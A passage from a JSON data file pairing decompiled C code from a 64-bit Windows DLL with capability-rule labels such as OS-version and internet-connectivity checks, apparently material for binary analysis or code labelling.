* 2 + 2U) &&\n                           (ppppiVar18 = ppppiVar7[-1],  0x1f < ppppiVar7 + (-8 - ppppiVar18)))\n                        goto code_r0x0001800590e0;\n                        fcn.18008fb24(ppppiVar18);\n                    }\n                }\n                iStack272 = iStack272 + 1;\n                iStack264 = iStack264 + 0x20;\n            } while (iStack272 < puStack312);\n        }\n        if (var_80h == 0) {\ncode_r0x00018005900f:\n            puVar12 = CONCAT62(Stack110, uStack112);\n            goto code_r0x000180059013;\n        }\n        fcn.180013b30(var_80h, var_bp_78h);\n        iVar9 = var_80h;\n        if (((var_bp_70h - var_80h & 0xffffffffffffffe0U) < 0x1000) ||\n           (iVar9 = *(var_80h + -8),  (var_80h - iVar9) - 8U < 0x20)) {\n            fcn.18008fb24(iVar9);\n            _var_80h = extraout_XMM0 & 0x0;\n            var_bp_70h = 0;\n            goto code_r0x00018005900f;\n        }\n    }\n    else {\n        ppppiVar7 = ppppiStack168;\n        if ((pppiStack144 + 1U < 0x1000) || (ppppiVar7 = ppppiStack168[-1],  ppppiStack168 + (-8 - ppppiVar7) < 0x20)) {\n            fcn.18008fb24(ppppiVar7);\n            goto code_r0x000180058ad9;\n        }\ncode_r0x0001800590bc:\n        fcn.1800b3528();\ncode_r0x0001800590c2:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x0001800590ce:\n    fcn.1800b3528();\ncode_r0x0001800590d4:\n    fcn.1800b3528();\ncode_r0x0001800590da:\n    fcn.1800b3528();\ncode_r0x0001800590e0:\n    fcn.1800b3528();\ncode_r0x0001800590e6:\n    fcn.1800b3528();\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 5235
    },
    "18005abe": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18005abe0(int64_t *arg1, uchar *arg2, uchar *arg3)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    ulong uVar8;\n    uchar *puVar9;\n    uint32_t *puVar10;\n    ulong uVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    uint64_t uVar14;\n    ulong *****pppppuVar15;\n    uint16_t **ppuVar16;\n    int64_t iVar17;\n    uint64_t uVar18;\n    uint64_t uVar19;\n    uint16_t **ppuVar20;\n    uint64_t uVar21;\n    uchar *arg2_00;\n    uint16_t *puVar22;\n    uint16_t *puVar23;\n    ulong *****pppppuVar24;\n    int64_t iVar25;\n    uint64_t uVar26;\n    uint64_t uVar27;\n    bool bVar28;\n    bool bVar29;\n    ulong var_10h_2;\n    ulong var_18h;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_30h;\n    ulong var_bp_40h;\n    ulong var_48h_2;\n    ulong var_50h;\n    ulong var_60h_2;\n    ulong var_bp_70h;\n    ulong var_80h;\n    ulong var_88h;\n    ulong var_90h;\n    ulong var_a0h;\n    ulong var_a8h;\n    ulong var_b0h;\n    ulong var_c0h;\n    ulong var_c8h;\n    ulong var_d0h;\n    ulong var_e0h;\n    ulong var_e8h;\n    ulong var_f0h;\n    uchar auStack568 [32];\n    uchar *puStack536;\n    uchar *puStack528;\n    char cStack520;\n    ulong uStack512;\n    code *pcStack504;\n    char cStack496;\n    uint64_t uStack488;\n    uint64_t uStack480;\n    uint64_t uStack472;\n    int64_t *piStack464;\n    int32_t iStack456;\n    uchar *puStack448;\n    uint64_t uStack440;\n    uint64_t uStack432;\n    uchar *puStack424;\n    uint64_t uStack416;\n    uchar *puStack408;\n    int64_t iStack400;\n    uint64_t uStack392;\n    uchar *puStack384;\n    uchar uStack376;\n    unkbyte7 Stack375;\n    ulong uStack360;\n    uint64_t uStack352;\n    uchar auStack344 [16];\n    ulong uStack328;\n    ulong uStack320;\n    uchar uStack312;\n    unkbyte7 Stack311;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    ulong uStack280;\n    int32_t aiStack272 [2];\n    uint32_t uStack264;\n    uint32_t uStack260;\n    uint32_t uStack256;\n    uint32_t uStack252;\n    uint64_t uStack248;\n    uint64_t uStack240;\n    ulong *****pppppuStack232;\n    uint uStack224;\n    uint uStack220;\n    uint16_t *puStack216;\n    uint64_t uStack208;\n    uchar uStack200;\n    unkbyte7 Stack199;\n    ulong uStack184;\n    uint64_t uStack176;\n    uint16_t uStack168;\n    unkbyte6 Stack166;\n    uint16_t *puStack152;\n    uint64_t uStack144;\n    ulong var_80h_2;\n    ulong var_bp_78h;\n    ulong uStack120;\n    uint64_t var_bp_68h;\n    ulong var_60h;\n    ulong var_bp_58h;\n    ulong var_50h_2;\n    ulong var_48h;\n    uint64_t uStack72;\n    ulong var_30h_2;\n    ulong var_28h_2;\n    ulong var_20h_2;\n    ulong var_10h;\n    ulong var_8h;\n    \n    uStack280 = 0xfffffffffffffffe;\n    uStack72 = *0x180123080 ^ auStack568;\n    piStack464 = arg1;\n    puStack448 = arg2;\n    if ((*(arg1 + 0xc4) != '\\0') && (cVar4 = (**(*arg1 + 0x58))(),  cVar4 == '\\0')) goto code_r0x00018005b613;\n    aiStack272[0] = -1;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, aiStack272);\n    if (aiStack272[0] < 0) goto code_r0x00018005b613;\n    iVar12 = *0x18012a398;\n    if (aiStack272[0] != 0) {\n        iVar12 = *0x18012a3a0;\n    }\n    if (iVar12 == 0) goto code_r0x00018005b613;\n    pcVar7 = (**0x1800de7f0)(iVar12, 0x888, 0, 0);\n    pcStack504 = pcVar7;\n    uVar8 = (**0x1800de7f0)(iVar12, 0x889, 0, 0);\n    var_50h_2._0_4_ = *0x180101910;\n    var_50h_2._4_4_ = *0x180101914;\n    var_48h._0_4_ = *0x180101918;\n    var_48h._4_4_ = *0x18010191c;\n    var_60h._0_1_ = 0;\n    uStack512 = uVar8;\n    cVar4 = fcn.1800602c0(arg1, &var_60h);\n    if (cVar4 == '\\0') {\ncode_r0x00018005b5d2:\n        uVar21 = CONCAT44(var_48h._4_4_, var_48h);\n        if (uVar21 < 0x10) goto code_r0x00018005b613;\n        iVar17 = CONCAT71(var_60h._1_7_, var_60h);\n        iVar12 = iVar17;\n        if (0xfff < uVar21 + 1) {\n            iVar12 = *(iVar17 + -8);\n            if (0x1f < (iVar17 - iVar12) - 8U) {\n                fcn.1800b3528(iVar12, uVar21 + 0x28);\ncode_r0x00018005b8ea:\n                fcn.1800b3528();\ncode_r0x00018005b8f0:\n                fcn.1800b3528();\n                goto code_r0x00018005b8f6;\n            }\n        }\n        fcn.18008fb24(iVar12);\ncode_r0x00018005b613:\n        fcn.18008fb00(uStack72 ^ auStack568);\n        return;\n    }\n    puStack152 = NULL;\n    uStack144 = 7;\n    uStack168 = 0;\n    cVar4 = fcn.180060420(arg1, &uStack168);\n    iVar12 = CONCAT62(Stack166, uStack168);\n    if (cVar4 == '\\0') {\ncode_r0x00018005b592:\n        if (7 < uStack144) {\n            iVar17 = iVar12;\n            if ((0xfff < uStack144 * 2 + 2) && (iVar17 = *(iVar12 + -8),  0x1f < (iVar12 - iVar17) - 8U)) {\ncode_r0x00018005b91a:\n                fcn.1800b3528();\n                pcVar7 = swi(3);\n                (*pcVar7)();\n                return;\n            }\n            fcn.18008fb24(iVar17);\n        }\n        goto code_r0x00018005b5d2;\n    }\n    iVar17 = arg1[0x25] - arg1[0x24];\n    iVar12 = iVar17 >> 0x3f;\n    if ((iVar17 / 0x28 + iVar12 == iVar12) || (iVar5 = *(arg1[0x24] + 0x20),  iVar5 < 1)) {\ncode_r0x00018005b58b:\n        iVar12 = CONCAT62(Stack166, uStack168);\n        goto code_r0x00018005b592;\n    }\n    puVar9 = (*pcVar7)(uVar8, 0x86a, 0, 0);\n    puStack384 = arg3;\n    if (puVar9 < arg3) {\n        puStack384 = puVar9;\n    }\n    if (iVar5 < 5) {\n        iStack456 = 1;\n    }\n    else {\n        iStack456 = (iVar5 + 1 >> 1) + -1;\n    }\n    uStack184 = 0;\n    uStack176 = 0xf;\n    uStack200 = 0;\n    fcn.180010fa0(&uStack200, 0x7fff);\n    uStack120 = CONCAT44(*0x180101914, *0x180101910);\n    var_bp_68h = CONCAT44(*0x18010191c, *0x180101918);\n    var_80h_2._0_1_ = 0;\n    uStack248 = 0;\n    uStack240 = 0xf;\n    uStack264 = uStack264 & 0xffffff00;\n    puStack408 = NULL;\n    uStack432 = 0;\n    uStack416 = (arg1[0x2d] - arg1[0x2c]) / 0xe8;\n    cStack520 = '\\x01';\n    puStack424 = auStack344;\n    uStack328 = 0;\n    uStack320 = 0xf;\n    auStack344[0] = 0;\n    fcn.180011120(auStack344, 0x1800f4a76, 0);\n    uStack296 = *0x180101910;\n    uStack292 = *0x180101914;\n    uStack288 = *0x180101918;\n    uStack284 = *0x18010191c;\n    uStack312 = 0;\n    fcn.180011120(&uStack312, 0x1800f4a77, 0);\n    puStack216 = CONCAT44(*0x180101914, *0x180101910);\n    uStack208 = CONCAT44(*0x18010191c, *0x180101918);\n    pppppuStack232 = pppppuStack232 & 0xffffffffffffff00;\n    pppppuVar15 = &pppppuStack232;\n    fcn.180011120(pppppuVar15, 0x1800fcc30, 0x10);\n    puStack528 = auStack344;\n    puStack536 = &uStack312;\n    puVar10 = fcn.180004b90(pppppuVar15, &uStack376, &var_60h, &pppppuStack232);\n    if (&uStack264 != puVar10) {\n        if (uStack240 < 0x10) {\ncode_r0x00018005af11:\n            uStack264 = *puVar10;\n            uStack260 = puVar10[1];\n            uStack256 = puVar10[2];\n            uStack252 = puVar10[3];\n            uStack248 = *(puVar10 + 4);\n            uStack240 = *(puVar10 + 6);\n            *(puVar10 + 4) = 0;\n            *(puVar10 + 6) = 0xf;\n            *puVar10 = 0;\n            goto code_r0x00018005af3f;\n        }\n        iVar17 = CONCAT44(uStack260, uStack264);\n        iVar12 = iVar17;\n        if ((uStack240 + 1 < 0x1000) || (iVar12 = *(iVar17 + -8),  (iVar17 - iVar12) - 8U < 0x20)) {\n            fcn.18008fb24(iVar12);\n            goto code_r0x00018005af11;\n        }\n        goto code_r0x00018005b8ea;\n    }\ncode_r0x00018005af3f:\n    if (0xf < uStack352) {\n        iVar17 = CONCAT71(Stack375, uStack376);\n        iVar12 = iVar17;\n        if ((0xfff < uStack352 + 1) && (iVar12 = *(iVar17 + -8),  0x1f < (iVar17 - iVar12) - 8U))\n        goto code_r0x00018005b8ea;\n        fcn.18008fb24(iVar12);\n    }\n    uStack360 = CONCAT44(*0x180101914, *0x180101910);\n    uStack352 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack376 = 0;\n    if (0xf < uStack208) {\n        pppppuVar15 = pppppuStack232;\n        if ((uStack208 + 1 < 0x1000) || (pppppuVar15 = pppppuStack232[-1],  pppppuStack232 + (-8 - pppppuVar15) < 0x20))\n        {\n            fcn.18008fb24(pppppuVar15);\n            goto code_r0x00018005afc6;\n        }\n        goto code_r0x00018005b8f0;\n    }\ncode_r0x00018005afc6:\n    puStack216 = CONCAT44(*0x180101914, *0x180101910);\n    uStack208 = CONCAT44(*0x18010191c, *0x180101918);\n    pppppuStack232 = pppppuStack232 & 0xffffffffffffff00;\n    if (CONCAT44(uStack284, uStack288) < 0x10) {\ncode_r0x00018005b012:\n        uVar21 = uStack248;\n        uStack480 = uStack248;\n        puVar9 = &uStack376;\n        uVar8 = fcn.18000de50(puVar9, &var_60h);\n        cVar4 = fcn.180008800(puVar9, uVar8);\n        uVar8 = uStack512;\n        cStack496 = cVar4 == '\\0';\n        uVar11 = (*pcVar7)(uStack512, 0x7d8, 0, 0);\n        puStack424 = (*pcVar7)(uVar8, 0x876, uVar11, 0);\n        *(arg1 + 0x17) = 0xffffffff;\n        arg1[0x16] = 0;\n        if (puStack448 < puStack384) {\ncode_r0x00018005b090:\n            iVar12 = (*pcVar7)(uVar8, 0x92e, puStack448, 0);\n            puVar9 = puStack448;\n            if (0x7fff < iVar12) goto code_r0x00018005b47a;\n            (*pcVar7)(uVar8, 0x869, puStack448);\n            uVar13 = (*pcVar7)(uVar8, 0x877, puVar9);\n            uVar14 = (*pcVar7)(uVar8, 0x858, puVar9);\n            arg2_00 = &uStack200;\n            if (0xf < uStack176) {\n                arg2_00 = CONCAT71(Stack199, uStack200);\n            }\n            uVar18 = uVar14 - uVar13;\n            uVar26 = uStack432;\n            uStack392 = uVar14;\n            if (cStack520 != '\\0') {\n                puStack408 = puVar9;\n                uStack432 = uVar13;\n                fcn.180011120(&var_80h_2, arg2_00, uVar18);\n                uVar8 = uStack512;\n                pcVar7 = pcStack504;\n                uVar26 = uVar13;\n                if (uVar18 == 0) goto code_r0x00018005b47a;\n            }\n            uVar13 = uVar14;\n            if (uVar21 == 0) {\ncode_r0x00018005b1ac:\n                cStack520 = '\\x01';\n                uVar19 = 0;\n                uVar8 = uStack512;\n                uVar18 = uVar19;\n                pcVar7 = pcStack504;\n                uVar27 = uVar19;\n                uVar21 = uStack480;\n                uStack472 = uVar13;\n                if (uStack416 != 0) {\n                    do {\n                        iVar5 = uVar27;\n                        cVar4 = fcn.18003c420(&var_80h_2, arg1[0x2c] + 0x40 + uVar18);\n                        if (cVar4 != '\\0') {\n                            if ((puStack408 <= puStack424) && (puStack424 <= puStack448)) {\n                                *(arg1 + 0x17) = uVar19;\n                                *(arg1 + 0x16) = uStack432;\n                                *(arg1 + 0xb4) = uVar14;\n                                *(arg1 + 0xbc) = uVar13;\n                            }\n                            iStack400 = arg1[0x2c] + uVar19 * 0xe8;\n                            uStack440 = *(iStack400 + 0xa8) - *(iStack400 + 0xa0) >> 2;\n                            ppuVar20 = iStack400 + 0x68;\n                            puVar3 = *(iStack400 + 0x78);\n                            if (7 < *(iStack400 + 0x80)) {\n                                ppuVar20 = *ppuVar20;\n                            }\n                            if (puVar3 < 0x8) {\n                                pppppuStack232 = *ppuVar20;\n                                uStack224 = *(ppuVar20 + 1);\n                                uStack220 = *(ppuVar20 + 0xc);\n                                uStack488 = 7;\n                                uStack208 = 7;\n                                pppppuVar15 = pppppuStack232;\n                            }\n                            else {\n                                uVar21 = puVar3 | 7;\n                                if (0x7ffffffffffffffe < uVar21) {\n                                    uVar21 = 0x7ffffffffffffffe;\n                                }\n                                uStack488 = uVar21;\n                                pppppuVar15 = fcn.180011cf0(&pppppuStack232, uVar21 + 1);\n                                pppppuStack232 = pppppuVar15;\n                                fcn.1800ade80(pppppuVar15, ppuVar20, puVar3 * 2 + 2);\n                                uStack208 = uVar21;\n                            }\n                            puStack216 = puVar3;\n                            uVar14 = 0;\n                            uVar13 = 0;\n                            uVar21 = uVar14;\n                            if (puVar3 == NULL) goto code_r0x00018005b408;\n                            puVar23 = &uStack168;\n                            if (7 < uStack144) {\n                                puVar23 = CONCAT62(Stack166, uStack168);\n                            }\n                            pppppuVar24 = &pppppuStack232;\n                            if (7 < uStack208) {\n                                pppppuVar24 = pppppuVar15;\n                            }\n                            uVar18 = uStack208;\n                            uVar21 = uVar13;\n                            if (puVar3 != puStack152) goto code_r0x00018005b366;\n                            uVar1 = *pppppuVar24;\n                            uVar2 = *puVar23;\n                            uVar18 = uStack488;\n                            if (uVar1 < uVar2) goto code_r0x00018005b366;\n                            iVar12 = pppppuVar24 - puVar23;\n                            bVar28 = uVar1 < uVar2;\n                            bVar29 = uVar1 == uVar2;\n                            puVar22 = puVar3;\n                            goto code_r0x00018005b341;\n                        }\n                        uVar19 = uVar19 + 1;\n                        uVar8 = uStack512;\n                        uVar18 = uVar18 + 0xe8;\n                        pcVar7 = pcStack504;\n                        uVar27 = iVar5 + iStack456;\n                        uVar21 = uStack480;\n                    } while (uVar19 < uStack416);\n                }\n            }\n            else {\n                if (uVar21 < uVar18) {\n                    puVar10 = &uStack264;\n                    if (0xf < uStack240) {\n                        puVar10 = CONCAT44(uStack260, uStack264);\n                    }\n                    if (uVar18 < uVar18 - uVar21) {\n                        fcn.18003c220();\n                        goto code_r0x00018005b90e;\n                    }\n                    uVar13 = 0xffffffffffffffff;\n                    if (uVar21 != 0xffffffffffffffff) {\n                        uVar13 = uVar21;\n                    }\n                    if ((uVar13 == uStack248) &&\n                       (iVar5 = fcn.1800ae4d0(arg2_00 + (uVar18 - uVar21), puVar10, uVar13),  iVar5 == 0)) {\n                        uVar13 = uVar14 - uVar21;\n                        goto code_r0x00018005b1ac;\n                    }\n                }\n                cStack520 = '\\0';\n                uVar8 = uStack512;\n                pcVar7 = pcStack504;\n            }\ncode_r0x00018005b47a:\n            puStack448 = puStack448 + 1;\n            if (puStack384 <= puStack448) goto code_r0x00018005b494;\n            goto code_r0x00018005b090;\n        }\ncode_r0x00018005b494:\n        if (0xf < uStack240) {\n            iVar17 = CONCAT44(uStack260, uStack264);\n            iVar12 = iVar17;\n            if ((0xfff < uStack240 + 1) && (iVar12 = *(iVar17 + -8),  0x1f < (iVar17 - iVar12) - 8U))\n            goto code_r0x00018005b8fc;\n            fcn.18008fb24(iVar12);\n        }\n        uStack248 = 0;\n        uStack240 = 0xf;\n        uStack264 = uStack264 & 0xffffff00;\n        if (0xf < var_bp_68h) {\n            iVar17 = CONCAT71(var_80h_2._1_7_, var_80h_2);\n            iVar12 = iVar17;\n            if ((var_bp_68h + 1 < 0x1000) || (iVar12 = *(iVar17 + -8),  (iVar17 - iVar12) - 8U < 0x20)) {\n                fcn.18008fb24(iVar12);\n                goto code_r0x00018005b520;\n            }\ncode_r0x00018005b90e:\n            fcn.1800b3528();\ncode_r0x00018005b914:\n            fcn.1800b3528();\n            goto code_r0x00018005b91a;\n        }\ncode_r0x00018005b520:\n        uStack120 = CONCAT44(*0x180101914, *0x180101910);\n        var_bp_68h = CONCAT44(*0x18010191c, *0x180101918);\n        var_80h_2._0_1_ = 0;\n        if (0xf < uStack176) {\n            iVar17 = CONCAT71(Stack199, uStack200);\n            iVar12 = iVar17;\n            if ((0xfff < uStack176 + 1) && (iVar12 = *(iVar17 + -8),  0x1f < (iVar17 - iVar12) - 8U))\n            goto code_r0x00018005b914;\n            fcn.18008fb24(iVar12);\n        }\n        uStack184 = 0;\n        uStack176 = 0xf;\n        uStack200 = 0;\n        goto code_r0x00018005b58b;\n    }\n    iVar17 = CONCAT71(Stack311, uStack312);\n    iVar12 = iVar17;\n    if ((CONCAT44(uStack284, uStack288) + 1 < 0x1000) || (iVar12 = *(iVar17 + -8),  (iVar17 - iVar12) - 8U < 0x20)) {\n        fcn.18008fb24(iVar12);\n        goto code_r0x00018005b012;\n    }\ncode_r0x00018005b8f6:\n    fcn.1800b3528();\ncode_r0x00018005b8fc:\n    fcn.1800b3528();\ncode_r0x00018005b902:\n    fcn.1800b3528();\n    pcVar7 = swi(3);\n    (*pcVar7)();\n    return;\n    while( true ) {\n        if (puVar22 == 0x1) goto code_r0x00018005b408;\n        puVar22 = puVar22 + -1;\n        puVar23 = puVar23 + 1;\n        uVar1 = *(iVar12 + puVar23);\n        bVar28 = uVar1 < *puVar23;\n        bVar29 = uVar1 == *puVar23;\n        if (bVar28) break;\ncode_r0x00018005b341:\n        if (!bVar28 && !bVar29) break;\n    }\ncode_r0x00018005b366:\n    ppuVar20 = piStack464[0x24];\n    iVar12 = piStack464[0x25] - ppuVar20 >> 0x3f;\n    iVar17 = (piStack464[0x25] - ppuVar20) / 0x28 + iVar12;\n    if (iVar17 != iVar12) {\n        do {\n            ppuVar16 = ppuVar20;\n            if (0x7 < ppuVar20[3]) {\n                ppuVar16 = *ppuVar20;\n            }\n            pppppuVar24 = &pppppuStack232;\n            if (7 < uVar18) {\n                pppppuVar24 = pppppuVar15;\n            }\n            if (puVar3 == ppuVar20[2]) {\n                uVar1 = *pppppuVar24;\n                uVar2 = *ppuVar16;\n                uVar18 = uStack488;\n                if (uVar2 <= uVar1) {\n                    iVar25 = pppppuVar24 - ppuVar16;\n                    bVar28 = uVar1 < uVar2;\n                    bVar29 = uVar1 == uVar2;\n                    puVar23 = puVar3;\n                    do {\n                        if (!bVar28 && !bVar29) break;\n                        if (puVar23 == 0x1) {\n                            iVar5 = 0;\n                            uVar21 = uVar14;\n                            goto code_r0x00018005b408;\n                        }\n                        puVar23 = puVar23 + -1;\n                        ppuVar16 = ppuVar16 + 2;\n                        uVar1 = *(ppuVar16 + iVar25);\n                        bVar28 = uVar1 < *ppuVar16;\n                        bVar29 = uVar1 == *ppuVar16;\n                    } while (!bVar28);\n                }\n            }\n            uVar14 = uVar14 + 1;\n            ppuVar20 = ppuVar20 + 5;\n        } while (uVar14 < iVar17 - iVar12);\n    }\ncode_r0x00018005b408:\n    uVar13 = 0;\n    iVar12 = piStack464[0x24] + uVar21 * 0x28;\n    uVar8 = uStack512;\n    pcVar7 = pcStack504;\n    if (*(iVar12 + 0x20) < 1) {\n        arg1 = piStack464;\n        uVar21 = uStack480;\n        if (7 < uStack488) {\n            pppppuVar24 = pppppuVar15;\n            if ((0xfff < uStack488 * 2 + 2) && (pppppuVar24 = pppppuVar15[-1],  0x1f < pppppuVar15 + (-8 - pppppuVar24))\n               ) goto code_r0x00018005b902;\n            fcn.18008fb24(pppppuVar24);\n            uVar8 = uStack512;\n            pcVar7 = pcStack504;\n            arg1 = piStack464;\n            uVar21 = uStack480;\n        }\n        goto code_r0x00018005b47a;\n    }\n    iVar17 = piStack464[0x2c];\n    if (cStack496 == '\\0') {\n        if (uStack440 != 0) {\n            do {\n                pcVar7 = pcStack504;\n                (*pcStack504)(uStack512, 0x7f0, uVar26, 0);\n                iVar6 = (*pcVar7)(uStack512, 0xa6e, uVar26, *(*(iStack400 + 0xa0) + uVar13 * 4));\n                uVar21 = uStack472;\n                pcVar7 = pcStack504;\n                uVar8 = uStack512;\n                uVar14 = iVar6;\n                iVar6 = *(*(uVar19 * 0xe8 + iVar17 + 0xd0) + uVar13 * 4);\n                iVar25 = iVar6;\n                if (iVar6 < 0) {\n                    iVar25 = (iVar5 + uVar13) % *(iVar12 + 0x20) + *(iVar12 + 0x24);\n                }\n                if ((uVar14 == 0) || (uStack472 < uVar14)) {\n                    (*pcStack504)(uStack512, 0x7f1, uStack472 - uVar26, iVar25);\n                    (*pcVar7)(uVar8, 0x7f0, uVar21, 0);\n                    (*pcVar7)(uVar8, 0x7f1, uStack480);\n                    uVar14 = 0;\n                    break;\n                }\n                (*pcStack504)(uStack512, 0x7f1, uVar14 - uVar26);\n                uVar13 = uVar13 + 1;\n                uVar21 = uStack472;\n                pcVar7 = pcStack504;\n                uVar26 = uVar14;\n            } while (uVar13 < uStack440);\n            uVar8 = uStack512;\n            if ((uVar14 != 0) && (uVar14 <= uVar21)) goto code_r0x00018005b737;\n        }\n    }\n    else if (uStack440 != 0) {\n        do {\n            (*pcStack504)(uStack512, 0x7f0, uVar26, 0);\n            pcVar7 = pcStack504;\n            uVar8 = uStack512;\n            uStack472._0_4_ = uStack472 - uVar26;\n            iVar5 = *(*(iStack400 + 0xa0) + uVar13 * 4);\n            uVar14 = uVar26 + iVar5;\n            if (uStack472 <= iVar5) {\n                (*pcStack504)(uStack512, 0x7f1, uStack472);\n                uStack472._0_4_ = 0;\n                (*pcVar7)(uVar8, 0x7f0, uStack472, 0);\n                (*pcVar7)(uVar8, 0x7f1, uStack480);\n                break;\n            }\n            (*pcStack504)(uStack512);\n            uVar13 = uVar13 + 1;\n            uVar26 = uVar14;\n        } while (uVar13 < uStack440);\n        uVar8 = uStack512;\n        pcVar7 = pcStack504;\n        if (0 < uStack472) {\ncode_r0x00018005b737:\n            uVar8 = uStack512;\n            (*pcVar7)(uStack512, 0x7f0, uVar14, 0);\n            (*pcVar7)(uVar8, 0x7f1, uStack392 - uVar14);\n        }\n    }\n    arg1 = piStack464;\n    uVar21 = uStack480;\n    if (7 < uStack488) {\n        pppppuVar24 = pppppuVar15;\n        if ((0xfff < uStack488 * 2 + 2) && (pppppuVar24 = pppppuVar15[-1],  0x1f < pppppuVar15 + (-8 - pppppuVar24)))\n        goto code_r0x00018005b902;\n        fcn.18008fb24(pppppuVar24);\n        arg1 = piStack464;\n        uVar21 = uStack480;\n    }\n    goto code_r0x00018005b47a;\n}\n",
        "token_count": 7589
    },
    "18005b92": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18005b920(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint64_t arg_38h;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong arg2;\n    int64_t iVar4;\n    ulong in_RDX;\n    ulong unaff_RBX;\n    ulong unaff_RBP;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    ulong in_R8;\n    ulong in_R9;\n    ulong noname_3;\n    ulong unaff_R14;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    ulong in_stack_00000098;\n    ulong in_stack_000000a0;\n    ulong in_stack_000000a8;\n    ulong in_stack_000000b0;\n    ulong in_stack_000000b8;\n    ulong in_stack_000000c0;\n    ulong in_stack_000000c8;\n    uchar auStack72 [32];\n    uint in_stack_ffffffffffffffd8;\n    uint in_stack_ffffffffffffffdc;\n    ulong in_stack_ffffffffffffffe8;\n    ulong in_stack_fffffffffffffff0;\n    \n    arg_38h = *0x180123080 ^ auStack72;\n    iVar1 = fcn.1800590f0(arg1, in_RDX, in_R8, in_R9, CONCAT44(in_stack_ffffffffffffffdc, in_stack_ffffffffffffffd8), \n                          arg_38h, in_stack_ffffffffffffffe8, in_stack_fffffffffffffff0, unaff_R14, in_stack_00000000, \n                          in_stack_00000008, in_stack_00000010, in_stack_00000018, in_stack_00000020, in_stack_00000028\n                          , in_stack_00000030, in_stack_00000038, in_stack_00000040, in_stack_00000048, \n                          in_stack_00000050, in_stack_00000058, in_stack_00000060, in_stack_00000068, in_stack_00000070\n                          , in_stack_00000078, in_stack_00000080, in_stack_00000088, in_stack_00000090, \n                          in_stack_00000098, in_stack_000000a0, in_stack_000000a8, in_stack_000000b0, in_stack_000000b8\n                          , in_stack_000000c0, in_stack_000000c8);\n    if (0 < iVar1) {\n        iVar1 = -1;\n        (**0x1800de7f0)(*0x18012a390, 0x7ec, 0);\n        if (-1 < iVar1) {\n            iVar4 = *0x18012a398;\n            if (iVar1 != 0) {\n                iVar4 = *0x18012a3a0;\n            }\n            if (iVar4 != 0) {\n                iVar2 = (**0x1800de7f0)(iVar4, 0x942, 0);\n                iVar3 = (**0x1800de7f0)(iVar4, 0x868, 0);\n                arg2 = (**0x1800de7f0)(iVar4, 0x8ad, iVar3);\n                noname_3 = 0;\n                iVar4 = (**0x1800de7f0)(iVar4, 0x8ad, iVar3 + iVar2);\n                fcn.18005abe0(arg1, arg2, iVar4 + 1);\n                fcn.18005c080(arg1, arg2, iVar4, noname_3, CONCAT44(in_stack_ffffffffffffffdc, iVar1), arg_38h, \n                              unaff_RDI, unaff_RSI, unaff_R14, in_stack_00000000, in_stack_00000008, unaff_RBX, \n                              unaff_RBP, in_stack_00000020, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                              in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, \n                              in_stack_00000060, in_stack_00000068, in_stack_00000070, in_stack_00000078);\n            }\n        }\n        fcn.18008fb00(arg_38h ^ auStack72);\n        return;\n    }\n    fcn.180056030(arg1);\n    (**0x1800de778)(*(arg1 + 0x98), 0x1800f8dbc);\n    fcn.18008fb00(arg_38h ^ auStack72);\n    return;\n}\n",
        "token_count": 1181
    },
    "18005c08": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18005c080(int64_t *arg1, uint64_t arg2, uint64_t arg3, ulong noname_3, ulong arg_30h, ulong arg_38h, \n                  ulong noname_6, ulong arg_48h, ulong arg_50h, ulong arg_58h, ulong arg_60h, ulong arg_68h, \n                  ulong noname_12, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong noname_16, ulong arg_98h, \n                  ulong arg_a0h, ulong arg_a8h, ulong noname_20, ulong arg_b8h, ulong noname_22, ulong noname_23, \n                  ulong arg_d0h)\n\n{\n    ushort *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int64_t iVar4;\n    char 